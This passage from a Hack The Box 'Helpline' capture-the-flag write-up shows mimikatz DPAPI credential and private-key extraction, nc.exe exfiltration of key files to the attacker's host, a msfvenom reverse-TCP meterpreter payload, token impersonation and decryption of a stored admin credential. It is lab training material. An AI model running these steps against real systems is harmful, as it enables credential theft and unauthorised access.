    pbKey            : 9dd4c16fe8fc2375858f5fdc643770d26bd55c48fec169c28d901820ebe28ea0d6845d2867e3a2bb3b763108da7fb69b5203d8a73ffb22b44d21949150546a0387e2a7d05a18b877f06d0dfe8baf89fc4029070bd5f0a5ac9cbe2379dda7facf6a2455ed8dae4dacd51b981b147ebddf12da71d4b22d675925ed576d92247aac8a39eb5080607382ecf2c3e9ea92ce2f

[backupkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : bce3d5c5463ff84017a1f9eabfb4b9ea
    rounds           : 00001f40 - 8000
    algHash          : 0000800e - 32782 (CALG_SHA_512)
    algCrypt         : 00006610 - 26128 (CALG_AES_256)
    pbKey            : 6d4e0478c22d0a52f7bc66249a0c6a7071991300dd122c4bee0aa31b72273938f336a44d08a15a2effcb2e5787069ab153e666dcd518b7af23e168577f56739f68c42e057508d7d5ffb16bf18d9e720873e644152d461d83356f500f4b8efbbcc9ee073a718134111f8b2708bf0f1645

[credhist]
  **CREDHIST INFO**
    dwVersion        : 00000003 - 3
    guid             : {0cc50e66-d2f0-43dc-97a5-5edac908aef9}


Auto SID from path seems to be: S-1-5-21-3107372852-1132949149-763516304-1011

[masterkey] with password: !zaq1234567890pl!99 (normal user)
  key : 1d0cea3fd8c42574c1a286e3938e6038d3ed370969317fb413b339f8699dcbf7f563b42b72ef45b394c61f73cc90c62076ea847f4c1e1fee3947f381d56d0f02                                                                          
  sha1: 8ece5985210c26ecf3dd9c53a38fc58478100ccb

mimikatz # dpapi::capi /in:"C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011\307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85" /masterkey:8ece5985210c26ecf3dd9c53a38fc58478100ccb            
**KEY (capi)**
  dwVersion          : 00000002 - 2
  dwUniqueNameLen    : 00000025 - 37
  dwSiPublicKeyLen   : 00000000 - 0
  dwSiPrivateKeyLen  : 00000000 - 0
  dwExPublicKeyLen   : 0000011c - 284
  dwExPrivateKeyLen  : 00000650 - 1616
  dwHashLen          : 00000014 - 20
  dwSiExportFlagLen  : 00000000 - 0
  dwExExportFlagLen  : 000000fc - 252
  pUniqueName        : e65e6804-f9cd-4a35-b3c9-c3a72a162e4d
  pHash              : 0000000000000000000000000000000000000000     
  pSiPublicKey       :    
  pSiPrivateKey      :    
  pSiExportFlag      :                        
  pExPublicKey       : 525341310801000000080000ff0000000100010031c3db401c7b5d3713443127af3f97dbe03b6cbcccb3df5be3581cdf50f2f45adec256b7c2b95af46aad7cdbe23308333b30c43d5baeda431a237d75f03a81aa713fae3cd9ef63637543
62f219c555d7feb1b7423f9d55a9cd2b8b4a559abcc2f349e707cfd966bba3cf70ab2dc663153598b33491a4492542d8ee2e0845aefa860ebe0d284b4ac32045053f7f167c7e4fbdc75bf53287dd598682dfffcd17dac3e550b3897bdb1a82c55809a124de231dfdd0e
51d19fa1bf7d748e524919dabdb427297dcc79eef2110c90bd44ebbdd720d4d69183b8691969fef65f1e19cebb8441da32f82ed4ba773b95666742a4650ef0ceece54d73130ed1a19c3bb61b60000000000000000                                          
  pExPrivateKey      :
  
  **BLOB**
    dwVersion          : 00000001 - 1
    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    dwMasterKeyVersion : 00000001 - 1
    guidMasterKey      : {2f452fc5-c6d2-4706-a4f7-1cd6b891c017}
    dwFlags            : 00000000 - 0 ()
    dwDescriptionLen   : 0000002c - 44
    szDescription      : CryptoAPI Private Key
    algCrypt           : 00006610 - 26128 (CALG_AES_256)
    dwAlgCryptLen      : 00000100 - 256
    dwSaltLen          : 00000020 - 32
    pbSalt             : d05086dc4a0e8c37b26b9298d6e507a07e6b01495c8e874636d6555909860bfc
    dwHmacKeyLen       : 00000000 - 0
    pbHmackKey         :
    algHash            : 0000800e - 32782 (CALG_SHA_512)
    dwAlgHashLen       : 00000200 - 512
    dwHmac2KeyLen      : 00000020 - 32
    pbHmack2Key        : b7a581f4205455a35c32cf2bae9d3be3fd90990ae6f63c417e9c5a06084d04f1
    dwDataLen          : 00000550 - 1360
    pbData             : 0dd1b5843b4e6da999ab982ff7bef727bd63f11eb222fd81420d24e0dc8a8c03910ddca26dba324e943a5357776530618f14c74382062047acb3f35debdb8f885a283c3644542dde4aa1175ac9d7a23e014bb92d85c2f51dd8eb6d0007
a2f4ca83df25b59f32794c2a4e227e526cd2d5f4a222ca9c14be15e62982107d91865a3e0fc04708144aa7fe7f7baf0c5a7b99c18f96e82c1f01dc8b41df64b51befd3a978a9d47a72246ceadfda631d09be350a4d3bf1301fba7e1b6c6e0c40bf95ce9e154f79cbef2
6d7a3c00d538e490132954d4ee94619dcdaf75e64676c89e89317d4668fe4b942a7bc21371efa3adf08152dabdf0d16e608cda6bdcca193771d736e19505e51f6e972ef5da070b0023e740dd96893d0458da1994f72aa3bc6846218e4634d4a199f698dcce5d2a96c68
8bb20d8138ac743fbff1a43934bbdcff40145ebc815edaf5080d63656236aba75261d7fe0b915e393912d8fe731bb4ab232f88553918c17d95f81605fb24bb9a7527e2eda01fc088e653ce99d58143a74595d47169cf58a2308e128e3956c0c4e225b1dfa0cd8cf030$
b670977c3b62b30bd09846e993779c4471cbd0682dc9bf038bfb8daf8286c0fd4fbcdcf135cb48dc38f0d34342a0116aef4211104657c20db578d9b21b2dbe2505bccc86a48b343f0f9df63482562f86f4015e6dc327a209684049188251506a8f39ae8946a9cdec43$
bb71e7d4fac63f33932dd0bd52fa5ffd48ff11c415e856a496252378fb19c456c3e191a19621c292654af48228906eac7ae5717a77a2c616e194ea9189e77cfa0252da0180fe128fa9f3a0cd826f7530dc03428e6ecbbc7ae7bffe0ce2780b3ba686c3d73f3da55af6$
65fec2c22cbb119a698c5bbbed802d3a31fb44e395606adb58e0b0e2030910281dbeeb76bddebf2ae6862633f839324cb72a9c05a7d24acc3cdad9648be0e816039581d4eb3ddefdc1457d3175b5c776ca445bd409038b6369fa9151f6ee88ab44e9d64b40ecd09e89$
7e2b36e51c44f93bc5a985c13cc0f8d31aad776167b027c28a09943580d848af506c68a400ed93734dbe579a84837a90c6fd60d338e9e981599086da725d7e6c87f89f9a59979672a8b74c704e848fc6cac786e49a3b7f310b2839d67652a9ae3018ce6aca06f6e60b$
bcf526f859a618b32b7b112088eefccf69e873e1d62a20b416203a2428d08abe22518eecfe0a5115a82efb21d467854444b15db49e82c4442aaa045fdf4ea725295da78d14082c9140b6ea6356039b48e53fb7eb8d3ea21713c346d6ff381aaf709c5e83e7d0c5e330f
f7374caccf6312f8f36afc041fcfd89a7e93d453393c991c3887d6b98179cc254172dfd4a09c968a25dab0b53df6f38c6b22e9352d0920789920659b1cb55c61f74bccb63fc397e0997f896e55efbaf200629dd399584f1675ebe588b025ee4160387aa3a5a3239899c
75a97eddbf5dc1dbf4defb894091c851f73413e2da6d7a39e23481dcda7857311a2816d720c0da057952e2d4218b2f4f735469cc4d15324de94b7036fb072afdb708929363934351feecc27c0c81206cafaa7bd5748456799cb528773cafc4b6f6fa25c6bc617b537ac
b354b10ddeb628974ad787f792a9b2564741b1ca8538de0647ab945e25aec233b247ca228111bcdafeed17f032d7277507934895b07197e8331451cd9eff35681afc625741ff13ee1daac61e16bea787ad2b3901a52d29c75c33a31d7993ed92a70d2196109d59b817f
e6471f24540f59c95d082556d05333201a4f54c71db4d135308c5339ecf8c63258a73e71d86b7ec0f3d71b8103de2d4b886b51f9994eb2f8a62c9bb444f8e1c19096085d4a67a9a16a9b74bb2d74c0298e499260dcdedd2d1cf94ed1f2e2bf1c4a194f79a3ff1bfb17c
6a
    dwSignLen          : 00000040 - 64
    pbSign             : b3854af7c1faaa30806aa909e65813225a9aede7b0705c4c186d080ced4883b22e9a06acfb1d7762b1c69e368dcecd0de3a7e8b8f112e61cd9231ad5c5eef596

  pExExportFlag      :
  **BLOB**
    dwVersion          : 00000001 - 1
    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    dwMasterKeyVersion : 00000001 - 1
    guidMasterKey      : {2f452fc5-c6d2-4706-a4f7-1cd6b891c017}
    dwFlags            : 00000000 - 0 ()
    dwDescriptionLen   : 00000018 - 24
    szDescription      : Export Flag
    algCrypt           : 00006610 - 26128 (CALG_AES_256)
    dwAlgCryptLen      : 00000100 - 256
    dwSaltLen          : 00000020 - 32
    pbSalt             : 61af1a324f58c63a6bb3767357892b8c95d9a9a0dea6da062322afc39734c72a
    dwHmacKeyLen       : 00000000 - 0
    pbHmackKey         :
    algHash            : 0000800e - 32782 (CALG_SHA_512)
    dwAlgHashLen       : 00000200 - 512
    dwHmac2KeyLen      : 00000020 - 32
    pbHmack2Key        : ee6cef3310951fa86aba9b0bc3b23c237d23fbac008175bf670b68b73899e983
    dwDataLen          : 00000010 - 16
    pbData             : 3766e1ec88316997e9aeb13d847c396e
    dwSignLen          : 00000040 - 64
    pbSign             : 1d17141018652ad326ebd1a9c3030feb1356fede8002391d9fbba2d5c75221e654aef732841a04638f5577b59e63c8037ed26c7e4f6d1ed34a6244c33e631800

Decrypting AT_EXCHANGE Export flags:
 * volatile cache: GUID:{2f452fc5-c6d2-4706-a4f7-1cd6b891c017};KeyHash:8ece5985210c26ecf3dd9c53a38fc58478100ccb                                                                                                   
 * masterkey     : 8ece5985210c26ecf3dd9c53a38fc58478100ccb
01000000
Decrypting AT_EXCHANGE Private Key:
 * volatile cache: GUID:{2f452fc5-c6d2-4706-a4f7-1cd6b891c017};KeyHash:8ece5985210c26ecf3dd9c53a38fc58478100ccb                                                                                                   
 * masterkey     : 8ece5985210c26ecf3dd9c53a38fc58478100ccb
525341320801000000080000ff0000000100010031c3db401c7b5d3713443127af3f97dbe03b6cbcccb3df5be3581cdf50f2f45adec256b7c2b95af46aad7cdbe23308333b30c43d5baeda431a237d75f03a81aa713fae3cd9ef6363754362f219c555d7feb1b7423f9
d55a9cd2b8b4a559abcc2f349e707cfd966bba3cf70ab2dc663153598b33491a4492542d8ee2e0845aefa860ebe0d284b4ac32045053f7f167c7e4fbdc75bf53287dd598682dfffcd17dac3e550b3897bdb1a82c55809a124de231dfdd0e51d19fa1bf7d748e524919d
abdb427297dcc79eef2110c90bd44ebbdd720d4d69183b8691969fef65f1e19cebb8441da32f82ed4ba773b95666742a4650ef0ceece54d73130ed1a19c3bb61b600000000000000006b686e241f8ac960bd719549bd40384959b682321394b15dd99070665bb0b3177
4d9a149b5b097b7ab965763e5592eeae40896efd89c92ef20519b995ac65c9258a8973e021efb6255514a42e5af7aa7ad028349c8ba92b61e2cb52ea740f15cdabf14f23f1aea32b3ab47c4ce72be3920314e8096fda33dd978fee18c79fde000000000d3d94b2498e1
0b913cc5c026ee19c672eaafe6eab8bb92b5c45b22be438d469a197a08b0ce230a926bf2418256c8397d5630de1ff89275cd1fa2ed1170b3408e697a505b61262a44db96763a532322a2cc070520af4f4539c4f44754513932481b76bd5765a7196cac8bf9fe9fad0d7
4460ece6677a99096b565705cc3de84cf00000000ff61d229009652074adf5045582172ff5638b61254e044b4714eb7f7261c019415a30c6e8bd1fa1d1fbc1ef0620394594d83ab2796416b80acb40ca77d7cccc1eca5eef9c6e0892e144defb31f6f3b20a69201485e
7058d72851f697307898c3957a3bb0bf0e65f1beb40b182c66627138fe5c264231d16d013bac509b9c937d00000000c7fc63389c2c563d9c380fc70de0774025d8f4a7ee15dd8c69de0ae2e5a8f881f939ade966c736ef7188374a9730ddfc99f5791d59ca8de461fbb
44a5326a29aee91d5f0eb903eb9ede3a76b03df9929b2afec0766e7dca2f4b25f4e370d95759db76a89c42812ba2c1a670a6727d8424f62c344f87dbf0b2686959335811e0e00000000505ecc240eefef332854553feabb019fa075baa1148953d142582f82d6cf1fc0
72267bd574d0d665dfafb8c9be8afd434f2250a840c6a0f80be883c70dafea4b6a1a23c29534a49188fa9c1c7df45788da79ced400db29799a057938fa3059f1ded01cbb8635dc3579ded3e9c16fc2d4bb7085ddda143c16657e24c2876c88bc00000000e1f11d6633a
644709fa252d8614531d2e8da61fc078ae8bfd91ce60582c914873d9dc6825bdd453d00594e3e286f1b843dd7154a8a67378272b2fce204162c87cb80320bd8a7e31bf646ee6b54635a4242abddef81876be6d33d9ffa356fb306c364c902ba52a43d9776d9c88d8de4
fcf11fea675cc8c1a1dcc79da2e3ec931f8fe342fecef6c883649e86cfda7d34cc01e0a128424df5d3a6f17dbea80983a6b4e14cb19c5a039b290bcdfe4c48dce945985f1c9d3464fec51b26b59d8ceacb52f5030d322566de54d42806900343b47d03ba31f67b60495
73ededc194c1be20f2a02700dc25de6e18b26d1dcc7b189c1822e6d2370c1ecc8af73e924000f2c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
        Exportable key : YES
        Key size       : 2048
        Private export : OK - 'raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk'
```
#### I used `nc` to transfer the `der` and `pvk` files to my box :
```
C:\Windows\System32\spool\drivers\color>nc.exe -w 3 10.10.xx.xx 1440 < 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der
nc.exe -w 3 10.10.xx.xx 1440 < 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der

C:\Windows\System32\spool\drivers\color>nc.exe -w 3 10.10.xx.xx 1440 < raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk        
nc.exe -w 3 10.10.xx.xx 1440 < raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk

C:\Windows\System32\spool\drivers\color>
```

```
root@kali:~/Desktop/HTB/boxes/helpline/tolu# nc -lp 1440 > 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der 
root@kali:~/Desktop/HTB/boxes/helpline/tolu# ls -la                                                                    
total 12
drwxr-xr-x 2 root root 4096 Aug 16 16:50 .
drwxr-xr-x 6 root root 4096 Aug 16 16:50 ..
-rw-r--r-- 1 root root  765 Aug 16 16:50 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der
root@kali:~/Desktop/HTB/boxes/helpline/tolu# nc -lp 1440 > raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk                                                             
root@kali:~/Desktop/HTB/boxes/helpline/tolu# ls -la                                         
total 16
drwxr-xr-x 2 root root 4096 Aug 16 16:51 .
drwxr-xr-x 6 root root 4096 Aug 16 16:50 ..
-rw-r--r-- 1 root root  765 Aug 16 16:50 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der
-rw-r--r-- 1 root root 1196 Aug 16 16:51 raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk
```
#### Then I created the `pfx` with `openssl` :
```
root@kali:~/Desktop/HTB/boxes/helpline/tolu# openssl x509 -inform DER -outform PEM -in 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der -out public.pem
root@kali:~/Desktop/HTB/boxes/helpline/tolu# openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk -out private.pem
writing RSA key
root@kali:~/Desktop/HTB/boxes/helpline/tolu# openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
#### And finally I imported it and I was able to read the flag :
![](/images/hackthebox/helpline/26.png)
#### I found later that I could also use `Invoke-Command` as `tolu` and I would be able to read the flag, still don't know why I couldn't read it from a `winrm` session.
```
PS C:\Windows\System32\spool\drivers\color> $username = "Helpline\tolu"
$username = "Helpline\tolu"
PS C:\Windows\System32\spool\drivers\color> $password = "!zaq1234567890pl!99"
$password = "!zaq1234567890pl!99"
PS C:\Windows\System32\spool\drivers\color> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\Windows\System32\spool\drivers\color> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
PS C:\Windows\System32\spool\drivers\color> Invoke-Command -ComputerName HELPLINE -Credential $credential -Authentication credssp -ScriptBlock { type C:\Users\tolu\Desktop\user.txt }
Invoke-Command -ComputerName HELPLINE -Credential $credential -Authentication credssp -ScriptBlock { type C:\Users\tolu\Desktop\user.txt }
```
![](/images/hackthebox/helpline/27.png)
#### We got user.
<br>
<hr>
### root.txt
#### There was a file called `admin-pass.xml` in `C:\Users\leo\Desktop`
```
C:\Users\leo\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D258-5C3B

 Directory of C:\Users\leo\Desktop

01/15/2019  01:21 AM    <DIR>          .
01/15/2019  01:21 AM    <DIR>          ..
01/15/2019  01:18 AM               526 admin-pass.xml
               1 File(s)            526 bytes
               2 Dir(s)   5,850,574,848 bytes free

C:\Users\leo\Desktop>type admin-pass.xml
type admin-pass.xml
Access is denied.
```
#### Only `leo` can read it. `leo's` hash was uncrackable so I looked for other ways to be `leo`. I wanted to see if I can impersonate `leo`'s token so I created a `metasploit` payload and got a `meterpreter` session.
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1441 -f exe > m.exe
```
#### And yes, I could impersonate `leo`'s token :
```
meterpreter > load incognito 
Loading extension incognito...Success.
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
HELPLINE\leo
HELPLINE\tolu
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token 'HELPLINE\leo'
[+] Delegation token available
[+] Successfully impersonated user HELPLINE\leo
meterpreter > shell -t 
Process 5344 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.253]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\System32\spool\drivers\color>whoami
whoami
helpline\leo

C:\Windows\System32\spool\drivers\color>
```
#### Now we can read `admin-pass.xml` :
```
C:\Windows\System32\spool\drivers\color>cd c:\users\leo\desktop
cd c:\users\leo\desktop

c:\Users\leo\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D258-5C3B

 Directory of c:\Users\leo\Desktop

01/15/2019  01:21 AM    <DIR>          .
01/15/2019  01:21 AM    <DIR>          ..
01/15/2019  01:18 AM               526 admin-pass.xml
               1 File(s)            526 bytes
               2 Dir(s)   5,719,506,944 bytes free

c:\Users\leo\Desktop>type admin-pass.xml
type admin-pass.xml
01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f2fefa98a0d84f4b917dd8a1f5889c8100000000020000000000106600000001000020000000c2d2dd6646fb78feb6f7920ed36b0ade40efeaec6b090556fe6efb52a7e847cc000000000e8000000002000020000000c41d656142bd869ea7eeae22fc00f0f707ebd676a7f5fe04a0d0932dffac3f48300000006cbf505e52b6e132a07de261042bcdca80d0d12ce7e8e60022ff8d9bc042a437a1c49aa0c7943c58e802d1c758fc5dd340000000c4a81c4415883f937970216c5d91acbf80def08ad70a02b061ec88c9bb4ecd14301828044fefc3415f5e128cfb389cbe8968feb8785914070e8aebd6504afcaa

c:\Users\leo\Desktop>
```
#### I used `Invoke-Command` again and used `Get-Content` to read `admin-pass.xml` instead of putting the password in a variable.
```
c:\Users\leo\Desktop>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\leo\Desktop> $username = "Helpline\Administrator"
$username = "Helpline\Administrator"
PS C:\Users\leo\Desktop> $password = "admin-pass.xml"
$password = "admin-pass.xml"
PS C:\Users\leo\Desktop> $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username, (Get-Content $password | ConvertTo-SecureString)
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username, (Get-Content $password | ConvertTo-SecureString)
PS C:\Users\leo\Desktop> Invoke-Command -ComputerName HELPLINE -Credential $credential -Authentication credssp -ScriptBlock {type C:\Users\Administrator\Desktop\root.txt}
Invoke-Command -ComputerName HELPLINE -Credential $credential -Authentication credssp -ScriptBlock {type C:\Users\Administrator\Desktop\root.txt}
```
![](/images/hackthebox/helpline/28.png)
#### We owned root !
#### That's it , Feedback is appreciated !
#### Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
#### Thanks for reading.
<br>
<br>
#### Previous Hack The Box write-up : [Hack The Box - Arkham](/hack-the-box/arkham/)
#### Next Hack The Box write-up : [Hack The Box - Unattended](/hack-the-box/unattended/)
<hr>